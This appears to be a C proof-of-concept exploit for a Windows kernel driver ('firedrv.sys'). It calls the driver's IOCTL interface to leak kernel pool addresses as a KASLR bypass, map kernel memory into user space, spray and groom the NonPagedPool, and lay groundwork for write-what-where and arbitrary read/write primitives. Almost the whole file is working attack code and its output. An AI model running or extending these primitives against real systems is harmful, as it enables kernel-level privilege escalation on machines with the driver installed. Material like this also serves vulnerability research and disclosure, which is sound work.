#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define DEVICE_PATH     L"\\\\.\\IntekNodeManager"
#define FIREDRV_IOCTL   0x80012044u
#define BUFFER_MAGIC    0xAC741001u
#define POOL_TAG_FDRV   0x56524446u
#define BUF_OBJ_SIZE    0x60

#pragma pack(push, 1)
typedef struct {
    uint32_t command;
    uint32_t pad1;
    uint64_t user_va;       /* offset +8: driver reads this as MdlAddress on free */
    uint32_t size;
    uint32_t pad2;
    uint8_t  pad3[32];
} FIREDRV_CMD;

typedef struct {
    uint32_t status;
    uint32_t pad1;
    uint64_t buffer_obj;
    uint64_t user_va;
    uint8_t  pad2[8];
} FIREDRV_RESP;
#pragma pack(pop)

static HANDLE open_device(void)
{
    HANDLE h = CreateFileW(DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("Failed to open %ls: error %lu\n", DEVICE_PATH, GetLastError());
    }
    return h;
}

static int firedrv_ioctl(HANDLE hDev, FIREDRV_CMD *cmd, FIREDRV_RESP *resp)
{
    DWORD ret = 0;
    FIREDRV_RESP r = {0};
    BOOL ok = DeviceIoControl(hDev, FIREDRV_IOCTL,
        cmd, sizeof(*cmd), &r, sizeof(r), &ret, NULL);
    if (!ok) return -(int)GetLastError();
    if (resp) *resp = r;
    return (int)r.status;
}

static int firedrv_alloc(HANDLE hDev, uint32_t size,
                         uint64_t *out_kobj, uint64_t *out_uva)
{
    FIREDRV_CMD cmd = {0};
    FIREDRV_RESP resp = {0};
    cmd.command = 0xDB;
    cmd.size = size;
    int rc = firedrv_ioctl(hDev, &cmd, &resp);
    if (rc != 0) return rc;
    if (out_kobj) *out_kobj = resp.buffer_obj;
    if (out_uva)  *out_uva  = resp.user_va;
    return 0;
}

static int firedrv_lock(HANDLE hDev, void *uva, uint32_t size,
                        uint64_t *out_kobj, uint64_t *out_umap)
{
    FIREDRV_CMD cmd = {0};
    FIREDRV_RESP resp = {0};
    cmd.command = 0xDB;
    cmd.user_va = (uint64_t)(uintptr_t)uva;
    cmd.size = size;
    int rc = firedrv_ioctl(hDev, &cmd, &resp);
    if (rc != 0) return rc;
    if (out_kobj) *out_kobj = resp.buffer_obj;
    if (out_umap) *out_umap = resp.user_va;
    return 0;
}

static int firedrv_free(HANDLE hDev, uint64_t kobj)
{
    FIREDRV_CMD cmd = {0};
    cmd.command = 0xDC;
    cmd.user_va = kobj; /* +8: where driver reads the buffer object ptr */
    return firedrv_ioctl(hDev, &cmd, NULL);
}

/* --- PRIMITIVE 1: kernel pool address leak --- */

static void demo_addr_leak(HANDLE hDev)
{
    printf("PRIM 1: Kernel Pool Address Leak\n\n");
    uint64_t kobj = 0, uva = 0;
    if (firedrv_alloc(hDev, 0x1000, &kobj, &uva) != 0) {
        printf("!!! Alloc failed !!\n"); return;
    }
    printf("Buffer object kernel address: 0x%016llx\n", kobj);
    printf("User mapping:                 0x%016llx\n", uva);
    printf("KASLR bypass: pool base ~ 0x%016llx\n", kobj & ~0xFFFFFULL);
    firedrv_free(hDev, kobj);
    printf("Freed\n\n");
}

/* --- PRIMITIVE 2: shared kernel/user memory --- */

static void demo_shared_mem(HANDLE hDev)
{
    printf("PRIM 2: Shared Kernel/User Memory\n\n");
    uint64_t kobj = 0, uva = 0;
    if (firedrv_alloc(hDev, 0x1000, &kobj, &uva) != 0) {
        printf("!! Alloc failed !!\n"); return;
    }
    printf("Kernel address:  0x%016llx\n", kobj);
    printf("User mapping:    0x%016llx\n", uva);

    volatile uint32_t *p = (volatile uint32_t *)(uintptr_t)uva;
    p[0] = 0xDEADBEEF; p[1] = 0xCAFEBABE;
    p[2] = 0x41414141; p[3] = 0x42424242;
    printf("Wrote markers through user mapping:\n");
    printf("    [0] = 0x%08X  [1] = 0x%08X\n", p[0], p[1]);
    printf("    [2] = 0x%08X  [3] = 0x%08X\n", p[2], p[3]);
    printf("LOOK! these are visible at kernel VA 0x%016llx\n", kobj);
    firedrv_free(hDev, kobj);
    printf("Freed\n\n");
}

/* --- PRIMITIVE 3: user page lock + dual map --- */

static void demo_page_lock(HANDLE hDev)
{
    printf("PRIM 3: User Page Lock + Dual Map\n\n");
    void *buf = VirtualAlloc(NULL, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { printf("!! VirtualAlloc failed !!\n"); return; }
    memset(buf, 'X', 0x2000);

    uint64_t kobj = 0, umap = 0;
    if (firedrv_lock(hDev, buf, 0x2000, &kobj, &umap) != 0) {
        printf("!! Lock failed !!\n");
        VirtualFree(buf, 0, MEM_RELEASE);
        return;
    }
    printf("User buffer: 0x%p\n", buf);
    printf("Buffer object:   0x%016llx\n", kobj);
    printf("User VA locked:  0x%016llx\n", umap);

    *(volatile uint32_t *)buf = 0x12345678;
    printf("Wrote 0x12345678 through user VA (hopium man)\n");
    firedrv_free(hDev, kobj);
    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[Freed and unlocked\n\n");
}

/* --- PRIMITIVE 4: NonPagedPool spray --- */

#define SPRAY_COUNT 64

static void demo_pool_spray(HANDLE hDev)
{
    printf("PRIM 4: NonPagedPool Spray\n\n");
    uint64_t kobjs[SPRAY_COUNT] = {0}, uvas[SPRAY_COUNT] = {0};
    int i, count = 0;

    printf("Spraying %d x 0x60-byte allocations (tag FDRV)...\n", SPRAY_COUNT);
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (firedrv_alloc(hDev, 0x1000, &kobjs[i], &uvas[i]) != 0) break;
        count++;
    }
    printf("Allocated %d/%d buffers\n", count, SPRAY_COUNT);

    uint64_t lo = UINT64_MAX, hi = 0;
    for (i = 0; i < count; i++) {
        if (kobjs[i] < lo) lo = kobjs[i];
        if (kobjs[i] > hi) hi = kobjs[i];
    }
    printf("Pool range: 0x%016llx - 0x%016llx\n", lo, hi);
    printf("Span: 0x%llx bytes\n\n", hi - lo);

    printf("Kernel addresses (buffer objects):\n");
    for (i = 0; i < count; i++)
        printf("    [%02d] 0x%016llx\n", i, kobjs[i]);

    printf("\nFreeing even-indexed allocations (creating 0x60-byte holes)...\n");
    int freed = 0;
    for (i = 0; i < count; i += 2) {
        firedrv_free(hDev, kobjs[i]);
        kobjs[i] = 0;
        freed++;
    }
    printf("Freed %d allocations - holes ready for target object replacement\n", freed);

    printf("Freeing remaining...\n");
    for (i = 1; i < count; i += 2)
        if (kobjs[i]) firedrv_free(hDev, kobjs[i]);
    printf("Pool spray complete\n\n");
}

/* --- PRIMITIVE 5: write-what-where via unlink --- */

static void demo_www(HANDLE hDev)
{
    printf("PRIM 5: Write-What-Where via Unlink\n\n");
    uint64_t ka, kb, kc, ua, ub, uc;
    printf("Allocating 3 adjacent buffers...\n");
    if (firedrv_alloc(hDev, 0x1000, &ka, &ua) ||
        firedrv_alloc(hDev, 0x1000, &kb, &ub) ||
        firedrv_alloc(hDev, 0x1000, &kc, &uc)) {
        printf("Alloc failed\n"); return;
    }
    printf("Buffer A: kobj=0x%016llx  umap=0x%016llx\n", ka, ua);
    printf("Buffer B: kobj=0x%016llx  umap=0x%016llx\n", kb, ub);
    printf("Buffer C: kobj=0x%016llx  umap=0x%016llx\n", kc, uc);

    int64_t dAB = (int64_t)kb - (int64_t)ka;
    int64_t dBC = (int64_t)kc - (int64_t)kb;
    printf("\nPool layout:\n");
    printf("    A->B delta: %+lld (0x%llx)\n", dAB, (uint64_t)(dAB < 0 ? -dAB : dAB));
    printf("    B->C delta: %+lld (0x%llx)\n", dBC, (uint64_t)(dBC < 0 ? -dBC : dBC));

    printf("\nNormal free (no corruption - safe unlink):\n");
    firedrv_free(hDev, kb);
    printf("Buffer B freed - list unlink completed normally\n");
    firedrv_free(hDev, ka);
    firedrv_free(hDev, kc);
    printf("Cleaned up A and C\n\n");
}

/* --- PRIMITIVE 6: per-card device scan --- */

static void demo_firecard_scan(void)
{
    printf("Device Scan Prim 6\n\n");
    printf("Scanning for FireCard devices...\n");
    int found = 0;
    wchar_t path[64];
    for (uint64_t addr = 0; addr < 0x100000000ULL; addr += 0x10000) {
        _snwprintf(path, 64, L"\\\\.\\FireCard%08llX", addr);
        HANDLE h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            printf("Found: %ls\n", path);
            CloseHandle(h);
            found++;
        }
    }
    if (!found) {
        printf("No FireCard devices found (need hw or emu)\n");
    }
    printf("\n");
}

/* --- PRIMITIVE 7: pool feng shui --- */

#define FSHUI_FILL  32
#define FSHUI_HOLE  8
#define FSHUI_GROOM 8

static void demo_feng_shui(HANDLE hDev)
{
    printf("=== PRIMITIVE 7: Pool Feng Shui ===\n\n");
    uint64_t fill_k[FSHUI_FILL], fill_u[FSHUI_FILL];
    uint64_t groom_k[FSHUI_GROOM], groom_u[FSHUI_GROOM];
    int i;

    printf("Phase 1: Fill pool page with 0x60-byte objects...\n");
    for (i = 0; i < FSHUI_FILL; i++)
        firedrv_alloc(hDev, 0x1000, &fill_k[i], &fill_u[i]);

    printf("Phase 2: Free slots 8-15 to create contiguous hole...\n");
    for (i = 8; i < 8 + FSHUI_HOLE; i++) {
        firedrv_free(hDev, fill_k[i]);
        fill_k[i] = 0;
    }

    printf("Phase 3: Re-allocate into freed holes...\n");
    for (i = 0; i < FSHUI_GROOM; i++)
        firedrv_alloc(hDev, 0x1000, &groom_k[i], &groom_u[i]);

    printf("Groom results:\n");
    for (i = 0; i < FSHUI_GROOM; i++)
        printf("    [%d] 0x%016llx\n", i, groom_k[i]);

    printf("Cleaning up...\n");
    for (i = 0; i < FSHUI_GROOM; i++)
        firedrv_free(hDev, groom_k[i]);
    for (i = 0; i < FSHUI_FILL; i++)
        if (fill_k[i]) firedrv_free(hDev, fill_k[i]);
    printf("Feng shui complete\n\n");
}

static void demo_arb_rw(HANDLE hDev)
{
    printf("PRIM 8: Arbitrary R/W Building Blocks\n\n");

    #define RW_SPRAY 32
    uint64_t sk[RW_SPRAY], su[RW_SPRAY];
    int i;

    printf("Step 1: Pool spray to get predictable layout...\n");
    for (i = 0; i < RW_SPRAY; i++)
        firedrv_alloc(hDev, 0x1000, &sk[i], &su[i]);

    for (i = 0; i < RW_SPRAY - 1; i++) {
        for (int j = i + 1; j < RW_SPRAY; j++) {
            if (sk[j] < sk[i]) {
                uint64_t t;
                t = sk[i]; sk[i] = sk[j]; sk[j] = t;
                t = su[i]; su[i] = su[j]; su[j] = t;
            }
        }
    }

    printf("Sorted pool addresses:\n");
    int adj_idx = -1;
    for (i = 0; i < RW_SPRAY; i++) {
        int64_t delta = (i < RW_SPRAY - 1) ? (int64_t)(sk[i+1] - sk[i]) : 0;
        printf("    [%02d] 0x%016llx", i, sk[i]);
        if (i < RW_SPRAY - 1) {
            printf("  delta=+0x%llx", (uint64_t)delta);
            if (delta == 0x70) {
                printf(" <-- ADJACENT (0x60 obj + 0x10 header)");
                if (adj_idx < 0) adj_idx = i;
            }
        }
        printf("\n");
    }

    if (adj_idx >= 0) {
        printf("\nFound adjacent pair at indices %d,%d\n", adj_idx, adj_idx+1);
        printf("    Buffer[%d] @ 0x%016llx\n", adj_idx, sk[adj_idx]);
        printf("    Buffer[%d] @ 0x%016llx\n", adj_idx+1, sk[adj_idx+1]);
        printf("    Gap: 0x%llx (0x60 object + 0x10 pool header)\n", sk[adj_idx+1] - sk[adj_idx]);
    } else {
        printf("\nNo exactly-adjacent pair found\n");
        printf("maybe try larger spray count or run after fresh boot?\n");
    }

    printf("\nStep 4: Shared memory relay for read-back...\n");
    uint64_t relay_k = 0, relay_u = 0;
    firedrv_alloc(hDev, 0x1000, &relay_k, &relay_u);
    printf("Relay buffer: kernel=0x%016llx user=0x%016llx\n", relay_k, relay_u);

    volatile uint64_t *relay = (volatile uint64_t *)(uintptr_t)relay_u;
    relay[0] = 0x4141414141414141ULL;
    printf("Wrote 0x%016llx to relay, readable from both sides\n", relay[0]);
    firedrv_free(hDev, relay_k);

    printf("\nCleaning up spray...\n");
    for (i = 0; i < RW_SPRAY; i++)
        firedrv_free(hDev, sk[i]);

    printf("Building blocks ran\n");
}

int main(int argc, char **argv)
{
    if (argc > 1 && strcmp(argv[1], "--help") == 0) {
        printf("Usage: %s [--rw | --info]\n", argv[0]);
        return 0;
    }

    printf("firedrv.sys PoC\n");
    printf("Opening %ls...\n", DEVICE_PATH);

    HANDLE hDev = open_device();
    if (hDev == INVALID_HANDLE_VALUE) return 1;
    printf("Device opened successfully\n\n");

    if (argc > 1 && strcmp(argv[1], "--rw") == 0) {
        demo_arb_rw(hDev);
    } else {
        demo_addr_leak(hDev);
        demo_shared_mem(hDev);
        demo_page_lock(hDev);
        demo_pool_spray(hDev);
        demo_www(hDev);
        demo_firecard_scan();
        demo_feng_shui(hDev);
    }

    printf("=== Done ===\n");
    CloseHandle(hDev);
    return 0;
}
